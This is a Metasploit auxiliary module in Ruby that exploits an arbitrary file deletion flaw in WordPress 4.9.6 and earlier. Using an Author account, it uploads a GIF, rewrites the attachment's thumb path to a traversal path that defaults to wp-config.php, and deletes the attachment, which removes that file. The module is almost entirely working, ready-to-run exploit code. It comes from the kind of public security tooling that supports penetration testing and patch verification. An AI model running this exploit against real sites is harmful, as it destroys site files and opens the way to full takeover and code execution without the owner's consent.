##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
      info,
      'Name'           => 'Wordpress Arbitrary File Deletion',
      'Description'    => %q(
        An arbitrary file deletion vulnerability in the WordPress core allows any user with privileges of an
        Author to completely take over the WordPress site and to execute arbitrary code on the server.
      ),
      'Author'         =>
          [
            'Slavco Mihajloski',   # Vulnerability discovery
            'Karim El Ouerghemmi', # Vulnerability discovery
            'Aloïs Thévenot'       # Metasploit module
          ],
      'License'        => MSF_LICENSE,
      'References'     =>
          [
            ['WPVDB', '9100'],
            ['EDB', '44949'],
            ['PACKETSTORM', '148333'],
            ['URL', 'https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/'],
            ['URL', 'https://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/']
          ],
      'Privileged'     => false,
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        => [['WordPress <= 4.9.6', {}]],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jun 26 2018'
    ))

    register_options(
      [
        OptString.new('USERNAME', [true, 'The WordPress username to authenticate with']),
        OptString.new('PASSWORD', [true, 'The WordPress password to authenticate with']),
        OptString.new('FILEPATH', [true, 'The path to the file to delete', '../../../../wp-config.php'])
      ]
    )
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def get_nonce(cookie)
    res = send_request_cgi(
      'method'  => 'GET',
      'uri'     => normalize_uri(wordpress_url_backend, 'upload.php'),
      'cookie'  => cookie
    )

    unless res && (res.code == 200)
      fail_with(Failure::UnexpectedReply, "Could not get the nonce (#{res.code})")
    end

    res.body.scan(/"_wpnonce":"([a-z0-9]+)"/)[0][0].to_s
  end

  def run
    vprint_status('Checking if target is online and running Wordpress...')
    if wordpress_and_online?.nil?
      fail_with(Failure::BadConfig, 'The target is not online and running Wordpress')
    end
    vprint_status('Checking access...')
    cookie = wordpress_login(username, password)
    if cookie.nil?
      fail_with(Failure::BadConfig, 'Invalid credentials')
    end
    store_valid_credential(user: username, private: password, proof: cookie)

    vprint_status('Getting the nonce...')
    nonce = get_nonce(cookie)

    vprint_status('Uploading media...')
    data = Rex::MIME::Message.new
    data.add_part(Rex::Text.decode_base64('R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs='), "image/gif", nil, "form-data; name=\"async-upload\"; filename=\"a.gif\"")
    data.add_part("upload-attachment", nil, nil, "form-data; name=\"action\"")
    data.add_part(nonce, nil, nil, "form-data; name=\"_wpnonce\"")

    post_data = data.to_s

    res = send_request_cgi(
      'method'  => 'POST',
      'uri'     => normalize_uri(wordpress_url_backend, 'async-upload.php'),
      'ctype'   => "multipart/form-data; boundary=#{data.bound}",
      'data'    => post_data,
      'cookie'  => cookie
    )

    unless res && (res.code == 200)
      fail_with(Failure::UnexpectedReply, "Could not upload the media (#{res.code})")
    end

    json = JSON.parse(res.body)
    id = json['data']['id']
    update_nonce = json['data']['nonces']['update']
    delete_nonce = json['data']['nonces']['delete']

    vprint_status('Editing thumb path...')
    res = send_request_cgi(
      'method'  => 'POST',
      'uri'     => normalize_uri(wordpress_url_backend, "post.php?post=#{id}"),
      'cookie'  => cookie,
      'vars_post' =>
          {
            'action' => 'editattachment',
            '_wpnonce' => update_nonce,
            'thumb' => datastore['FILEPATH']
          }
    )

    unless res && (res.code == 302)
      fail_with(Failure::UnexpectedReply, "Could not edit media (#{res.code})")
    end

    vprint_status('Deleting media...')
    res = send_request_cgi(
      'method'  => 'POST',
      'uri'     => normalize_uri(wordpress_url_backend, 'admin-ajax.php'),
      'cookie'  => cookie,
      'vars_post' =>
          {
            'action' => 'delete-post',
            '_wpnonce' => delete_nonce,
            'id' => id
          }
    )

    unless res && (res.code == 200)
      fail_with(Failure::UnexpectedReply, "Could not delete media (#{res.code})")
    end

    print_good('File deleted!')
  end
end
